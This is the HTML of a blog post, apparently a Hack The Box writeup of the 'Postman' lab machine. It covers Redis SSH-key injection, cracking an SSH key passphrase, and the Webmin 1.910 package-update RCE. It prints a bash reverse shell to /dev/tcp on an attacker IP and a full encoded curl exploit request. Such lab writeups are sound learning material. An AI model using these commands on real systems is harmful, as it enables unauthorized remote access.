@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" type="text/css" href="/assets/css/print.css" media="print">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Writeup [Linux - Easy] - Postman | OmniSl4sh’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="HTB Writeup [Linux - Easy] - Postman" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/2022/11/02/Postman.html" />
+<meta property="og:url" content="http://localhost:4000/2022/11/02/Postman.html" />
+<meta property="og:site_name" content="OmniSl4sh’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-11-02T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Writeup [Linux - Easy] - Postman" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-11-02T00:00:00+02:00","datePublished":"2022-11-02T00:00:00+02:00","headline":"HTB Writeup [Linux - Easy] - Postman","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/11/02/Postman.html"},"url":"http://localhost:4000/2022/11/02/Postman.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body>
+    <div id="container">
+      <div class="inner">
+        <header>
+          <h1><a href="http://localhost:4000/">OmniSl4sh's Blog</a></h1>
+          <h2></h2>
+        </header>
+        <!--<<section id="downloads" class="clearfix">
+          
+  
+        </section>
+        hr>-->
+        <section id="main_content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB Writeup [Linux - Easy] - Postman</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-11-02T00:00:00+02:00" itemprop="datePublished">Nov 2, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/assets/Postman/Postman.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Postman</strong> is a relatively easy <strong>Linux</strong> box where we find a <strong>misconfigured Redis instance</strong> that allows for <strong>access without authentication.</strong></li>
+  <li>We exploit that to <strong>write our public SSH key</strong> into Redis’ own <code class="language-plaintext highlighter-rouge">authorized_keys</code> file which <strong>gets us on the machine</strong> as the <code class="language-plaintext highlighter-rouge">redis</code> user.</li>
+  <li><em>While browsing the file system,</em> we come across a <strong>passphrase-protected backup</strong> of a <strong>private SSH key</strong> belonging to a user called <code class="language-plaintext highlighter-rouge">Matt</code>.</li>
+  <li><em>Using</em> <code class="language-plaintext highlighter-rouge">ssh2john</code> <em>and</em> <code class="language-plaintext highlighter-rouge">john</code>, we’re able to <strong>crack that key’s passphrase</strong>. <em>However,</em> using <strong>SSH didn’t work.</strong></li>
+  <li><em>Because</em> <code class="language-plaintext highlighter-rouge">Matt</code> <em>was</em> <strong><em>reusing the password,</em></strong> we used <code class="language-plaintext highlighter-rouge">su</code> to <strong>switch to his user</strong> from the shell that we had.</li>
+  <li><em>Trying to</em> <strong><em>escalate our privileges,</em></strong> we found <strong>Webmin</strong> running as <code class="language-plaintext highlighter-rouge">root</code>. And also <strong>found its version (1.910) vulnerable.</strong></li>
+  <li>The vulnerability could lead to <strong>Remote Code Exection</strong> <em>if</em> we had <strong>valid credentials</strong> for a user with <strong>access to install package updates.</strong></li>
+  <li>We tested <code class="language-plaintext highlighter-rouge">Matt</code>’s credentials that we previously found and were able to <strong>authenticate successfully</strong>. We also had the <strong>necessary privileges.</strong></li>
+  <li>We owned the box using both <strong>Metasploit</strong> and also using <code class="language-plaintext highlighter-rouge">curl</code> after <strong>taking some time to observe and manually recreate the exploit ourselves.</strong></li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: The Cyber Geek's Personal Website
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+6379/tcp  open  redis   Redis key-value store 
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+|_http-server-header: MiniServ/1.910
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">nmap</code> scan shows a <strong>standard SSH port</strong> as well as <strong>HTTP on port 80.</strong></p>
+
+<p>what’s <strong>unique</strong> here is both /<strong>Redis on port 6379</strong> and <strong>Webmin on port 10000.</strong></p>
+
+<h2 id="testing-redis-and-exploiting-misconfiguration-for-rce">Testing Redis and Exploiting Misconfiguration for RCE</h2>
+<p><em>Because it can lead to</em> <strong><em>a very quick RCE</em></strong> <em>if not configured with authentication,</em> we <strong>try Redis first.</strong></p>
+
+<p>we can <strong>connect</strong> to it with a simple command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis-cli <span class="nt">-h</span> 10.10.10.160
+</code></pre></div></div>
+
+<p><strong>Note:</strong> you can <strong>install</strong> the <code class="language-plaintext highlighter-rouge">redis-cli</code> tool using <code class="language-plaintext highlighter-rouge">apt install redis-tools</code></p>
+
+<p><em>after connecting,</em> we get a <strong>prompt</strong>. so we run <code class="language-plaintext highlighter-rouge">info</code> as a <strong>basic command</strong> to <strong>check if we have access or not.</strong></p>
+
+<p><img src="/assets/Postman/redis-info.jpg" alt="" /></p>
+
+<p><strong>and we do!</strong></p>
+
+<p>One of the ways to <strong>gain Remote Code Execution</strong> through Redis is through <strong>modifying the</strong> <code class="language-plaintext highlighter-rouge">redis</code> <strong>user’s SSH files</strong>. It’s fully-explained <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh">here</a>.</p>
+
+<p><em>since</em> <code class="language-plaintext highlighter-rouge">/var/lib/redis/.ssh</code> <em>is</em> <strong><em>Redis’ default SSH directory,</em></strong> we will attempt to <strong>add our own public key</strong> to its <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
+
+<p>we first <strong>generate our own key pair</strong> using <code class="language-plaintext highlighter-rouge">ssh-keygen</code></p>
+
+<p><img src="/assets/Postman/ssh-keygen.jpg" alt="" /></p>
+
+<p>then <strong>echo the public key</strong> <em>(wrapped around double new lines)</em> into <code class="language-plaintext highlighter-rouge">redis-cli</code> with the <code class="language-plaintext highlighter-rouge">-x</code> flag to <strong>take input from STDIN</strong></p>
+
+<p>and <strong>proceed with the same steps</strong> as below.</p>
+
+<p><img src="/assets/Postman/redis-adding-the-public-key.jpg" alt="" /></p>
+
+<p><strong>Note:</strong> <em>for a breakdown of what each command does,</em> you can <strong>refer</strong> to the <a href="https://redis.io/commands/">official documentation</a>.</p>
+
+<p><em>having recieved the expected responses,</em> we go ahead and try connecting with the <code class="language-plaintext highlighter-rouge">redis</code> user:</p>
+
+<p><img src="/assets/Postman/redis-ssh-success.jpg" alt="" /></p>
+
+<p><strong>we’re good to go :D</strong></p>
+
+<h2 id="pivoting-to-matt">Pivoting to Matt</h2>
+<p><em>After getting on the box, and while checking the file system,</em> we visit the <code class="language-plaintext highlighter-rouge">/opt</code> directory <em>(since it may contain interesting files).</em></p>
+
+<p>we <strong>had a finding</strong> there:</p>
+
+<p><img src="/assets/Postman/pivot-finding-matts-backup-key.jpg" alt="" /></p>
+
+<p>it seems like a <strong>passphrase-protected backup</strong> of <code class="language-plaintext highlighter-rouge">Matt</code>’s <strong>private SSH key.</strong></p>
+
+<p>we’re going to use <code class="language-plaintext highlighter-rouge">ssh2john</code> to <strong>get a hash in a crackable format</strong> for <code class="language-plaintext highlighter-rouge">john</code>.</p>
+
+<p><img src="/assets/Postman/pivot-cracking-matts-key.jpg" alt="" /></p>
+
+<p><strong>sucessfully cracked</strong> with <code class="language-plaintext highlighter-rouge">rockyou.txt</code> we should be able to SSH now.</p>
+
+<p><img src="/assets/Postman/pivot-cant-ssh-as-matt.jpg" alt="" /></p>
+
+<p>but we couldn’t :/</p>
+
+<p>the next thing we tried was using <code class="language-plaintext highlighter-rouge">su</code> from our existing shell.</p>
+
+<p><img src="/assets/Postman/pivot-su-matt.jpg" alt="" /></p>
+
+<p><strong>which worked.</strong></p>
+
+<h2 id="exploiting-webmin-for-privilege-escalation">Exploiting Webmin for Privilege Escalation</h2>
+<p><em>From the</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>scan,</em> we noticed that <strong>Webmin’s version is 1.910.</strong></p>
+
+<p><em>and, because its process is</em> <strong><em>running as</em></strong> <code class="language-plaintext highlighter-rouge">root</code>, we know we should check this out.</p>
+
+<p><img src="/assets/Postman/privesc-webmin-running-as-root.jpg" alt="" /></p>
+
+<p>we get <strong>plenty of results</strong> when <strong>Googling for exploits:</strong></p>
+
+<p><img src="/assets/Postman/privesc-webmin-exploit-search.jpg" alt="" /></p>
+
+<p>we decided to check the <a href="https://www.exploit-db.com/exploits/46984">Exploit-DB</a> one.</p>
+
+<p><em>being a</em> <strong>verified Metasploit Module,</strong> we can expect a <strong>well-written exploit :)</strong></p>
+
+<p><em>from its description,</em> this seems like it <strong>requires a valid user.</strong></p>
+
+<p><img src="/assets/Postman/privesc-webmin-exploit-requirements.jpg" alt="" /></p>
+
+<p><em>to</em> <strong><em>check our credentials,</em></strong> we <strong>visit port 10000</strong>.</p>
+
+<p>we get <strong>redirected to HTTPS</strong> and the <strong>hostname changes to postman.</strong></p>
+
+<p><em>when we try logging in as</em> <code class="language-plaintext highlighter-rouge">Matt</code> <strong><em>using the same password</em></strong> <code class="language-plaintext highlighter-rouge">computer2008</code>, we <strong>get authenticated.</strong></p>
+
+<p><strong><em>Matt was reusing the password here as well :)</em></strong></p>
+
+<p><img src="/assets/Postman/privesc-webmin-logged-in.jpg" alt="" /></p>
+
+<p><em>furthermore,</em> we seem to <strong>have the needed privilege (to update packages)</strong>. we <strong>confirmed this</strong> by <strong>clicking the link highlighted above.</strong></p>
+
+<p><img src="/assets/Postman/privesc-webmin-package-privilege.jpg" alt="" /></p>
+
+<h3 id="exploitation-the-quick-and-easy-way-metasploit">Exploitation the quick and easy way: Metasploit</h3>
+<p><strong><em>After setting,</em></strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">RHOSTS</code></li>
+  <li><code class="language-plaintext highlighter-rouge">USERNAME</code> and <code class="language-plaintext highlighter-rouge">PASSWORD</code></li>
+  <li><code class="language-plaintext highlighter-rouge">SSL</code> to <code class="language-plaintext highlighter-rouge">true</code></li>
+  <li><code class="language-plaintext highlighter-rouge">LHOST</code> and <code class="language-plaintext highlighter-rouge">LPORT</code></li>
+</ul>
+
+<p><strong><em>then running the exploit,</em></strong></p>
+
+<p>we get an <strong>easy shell</strong> as <code class="language-plaintext highlighter-rouge">root</code></p>
+
+<p><img src="/assets/Postman/privesc-webmin-metasploit.jpg" alt="" /></p>
+
+<h3 id="understanding-and-mimicking-the-exploit-with-curl">Understanding and Mimicking the exploit with curl</h3>
+<p><em>Looking at the exploit code,</em> we find <strong>six functions</strong> defined:</p>
+
+<p><code class="language-plaintext highlighter-rouge">initialize</code> <strong>sets up the module’s properties.</strong></p>
+
+<p><img src="/assets/Postman/exploit-analysis-init.jpg" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">peer</code> seems to <strong>adjust the url</strong> based on <strong>whether it’s HTTP or HTTPS</strong> to be later used in the <code class="language-plaintext highlighter-rouge">Referer</code> header.</p>
+
+<p><img src="/assets/Postman/exploit-analysis-peer.jpg" alt="" /></p>
+
+<p>the <code class="language-plaintext highlighter-rouge">login</code> function is self-descriptive :) it <strong>logs in</strong> and <strong>retrieves the</strong> <code class="language-plaintext highlighter-rouge">sid</code> <strong>cookie.</strong></p>
+
+<p><img src="/assets/Postman/exploit-analysis-login.jpg" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">check</code> <strong>verifies if the version is indeed the vulnerable one</strong> (1.910) and <strong>if our user has the privilege to update packages.</strong></p>
+
+<p><img src="/assets/Postman/exploit-analysis-check.jpg" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">run_update</code> <strong>sends a POST request</strong> with <strong>both the</strong> <code class="language-plaintext highlighter-rouge">sid</code> <strong>cookie</strong> and <strong>the</strong> <code class="language-plaintext highlighter-rouge">Referer</code> <strong>header</strong>.</p>
+
+<p>It then <strong>uses a base64-encoded payload</strong> for execution <em>(demonstrated later)</em>.</p>
+
+<p>notice <strong>the POST data</strong> as well.</p>
+
+<p><img src="/assets/Postman/exploit-analysis-run-update.jpg" alt="" /></p>
+
+<p><em>and finally,</em> <code class="language-plaintext highlighter-rouge">exploit</code> <strong>calls the</strong> <code class="language-plaintext highlighter-rouge">login</code> <strong>function</strong> followed by <code class="language-plaintext highlighter-rouge">run-update</code> to <strong>perform the exploitation.</strong></p>
+
+<p><img src="/assets/Postman/exploit-analysis-exploit.jpg" alt="" /></p>
+
+<p><em>to see how the</em> <strong><em>base64-encoded payload works,</em></strong> we try a simple <code class="language-plaintext highlighter-rouge">id</code> command:</p>
+
+<p><img src="/assets/Postman/privesc-webmin-b64-payload.jpg" alt="" /></p>
+
+<p>it’s basically an <code class="language-plaintext highlighter-rouge">echo</code> with <strong>command encoded in base64</strong> to <strong>avoid bad characters</strong>.</p>
+
+<p>then it’s passed to <code class="language-plaintext highlighter-rouge">base64</code> with <code class="language-plaintext highlighter-rouge">-d</code> to <strong>decode it</strong> before <strong>piping it</strong> to <code class="language-plaintext highlighter-rouge">bash</code> with the <code class="language-plaintext highlighter-rouge">-i</code> flag to <strong>execute it interactively.</strong></p>
+
+<p><strong><em>to get a bash reverse shell,</em></strong> we’re going to replace the <code class="language-plaintext highlighter-rouge">id</code> command with this one-liner:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.16.9/9000 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>and then <strong>encode it as base64</strong> before placing it within the main payload:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s2">"{echo,'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ=='}|{base64,-d}|{bash,-i}"</span>
+</code></pre></div></div>
+
+<p>then finally <strong>URL-encode</strong> all that to be <strong>part of the POST data:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash%20-c%20%22%7Becho%2C%27YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ%3D%3D%27%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22
+</code></pre></div></div>
+
+<p><strong><em>to access the authenticated page,</em></strong> we’re also going to <strong>grab</strong> <code class="language-plaintext highlighter-rouge">Matt</code>’s <code class="language-plaintext highlighter-rouge">sid</code> <strong>cookie</strong> from the browser. <em>(The extension used here is called</em> <strong>“Cookie Editor”</strong><em>)</em></p>
+
+<p><img src="/assets/Postman/privesc-webmin-sid-cookie.jpg" alt="" /></p>
+
+<p>and add it to <strong>create our own</strong> <code class="language-plaintext highlighter-rouge">curl</code> <strong>variant of the exploit:</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-k</code> to <strong>allow insecure connections with SSL</strong></li>
+  <li><code class="language-plaintext highlighter-rouge">-s</code> and <code class="language-plaintext highlighter-rouge">-o /dev/null</code> to <strong>supress the noisy output</strong></li>
+  <li><code class="language-plaintext highlighter-rouge">-X POST</code> to <strong>set the request method</strong></li>
+  <li><code class="language-plaintext highlighter-rouge">-b</code> to add the <code class="language-plaintext highlighter-rouge">sid</code> cookie</li>
+  <li><code class="language-plaintext highlighter-rouge">-H</code> for adding the <code class="language-plaintext highlighter-rouge">Referer</code> header</li>
+  <li><code class="language-plaintext highlighter-rouge">-d</code> to <strong>fill out the POST data</strong></li>
+</ul>
+
+<p><em>together,</em> <strong>it should look like this:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-k</span> <span class="nt">-s</span> <span class="nt">-o</span> /dev/null <span class="se">\</span>
+<span class="nt">-X</span> POST <span class="se">\</span>
+<span class="nt">-b</span> <span class="s2">"sid=2d2cc255b41d67cb4dc38ef0dbfb2ad7"</span> <span class="se">\</span>
+<span class="nt">-H</span> <span class="s2">"Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1"</span> <span class="se">\</span>
+<span class="nt">-d</span> <span class="s2">"u=acl%2Fapt&amp;u=%20%7C%20bash%20-c%20%22%7Becho%2C%27YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ%3D%3D%27%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22&amp;ok_top=Update+Selected+Packages"</span> <span class="se">\</span>
+https://10.10.10.160:10000/package-updates/update.cgi
+</code></pre></div></div>
+
+<p><em>after starting our</em> <code class="language-plaintext highlighter-rouge">netcat</code> <em>listener,</em> we <strong>issue the command</strong> and get back <strong>a sweet reverse shell.</strong></p>
+
+<p><img src="/assets/Postman/privesc-webmin-curl.jpg" alt="" /></p>
+
+<p><strong>Pretty nice :)</strong></p>
+
+  </div><a class="u-url" href="/2022/11/02/Postman.html" hidden></a>
+</article>
+
+        </section>
+
+        <footer>
+        
+          This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.
+        </footer>
+
+      </div>
+    </div>
+  </body>
+</html>
